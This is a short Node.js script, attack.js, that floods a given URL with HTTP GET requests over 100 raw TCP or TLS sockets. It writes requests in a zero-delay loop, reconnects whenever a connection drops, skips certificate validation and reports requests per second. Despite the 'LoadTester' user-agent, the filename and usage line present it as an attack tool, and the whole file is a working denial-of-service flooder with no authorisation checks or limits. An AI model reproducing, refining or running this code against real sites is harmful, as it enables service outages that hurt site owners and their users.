// attack.js
const net = require('net');
const tls = require('tls');
const { URL } = require('url');

if (process.argv.length < 4) {
  console.log('USAGE: node attack.js https://target.com time_in_seconds');
  process.exit(1);
}

const target = new URL(process.argv[2]);
const duration = parseInt(process.argv[3]) * 1000;
const endTime = Date.now() + duration;

const isHttps = target.protocol === 'https:';
const port = target.port || (isHttps ? 443 : 80);
const host = target.hostname;
const path = target.pathname + target.search;

let totalSent = 0;
let lastSent = 0;
let maxRps = 0;

const REQUEST = [
  `GET ${path} HTTP/1.1`,
  `Host: ${host}`,
  `User-Agent: LoadTester/1.1`,
  `Connection: keep-alive`,
  ``,
  ``
].join('\r\n');

function createSocketConnection() {
  const client = isHttps
    ? tls.connect(port, host, { rejectUnauthorized: false })
    : net.connect(port, host);

  client.on('connect', () => {
    pumpRequests(client);
  });

  client.on('error', () => {
    setTimeout(createSocketConnection, 100); // Retry on error
  });

  client.on('end', () => {
    createSocketConnection(); // Restart on end
  });
}

function pumpRequests(socket) {
  const interval = setInterval(() => {
    if (Date.now() > endTime) {
      clearInterval(interval);
      socket.destroy();
      return;
    }

    try {
      socket.write(REQUEST);
      totalSent++;
    } catch (e) {
      socket.destroy();
    }
  }, 0); // As fast as it can
}

// Launch 100 socket connections
const sockets = 100;
for (let i = 0; i < sockets; i++) {
  createSocketConnection();
}

// Logging every 3 seconds
setInterval(() => {
  const nowSent = totalSent;
  const rps = nowSent - lastSent;
  if (rps > maxRps) maxRps = rps;
  lastSent = nowSent;

  process.stdout.write(`\rTotal sent: ${totalSent}  |  Max-r: ${maxRps} rps     `);
}, 3000);
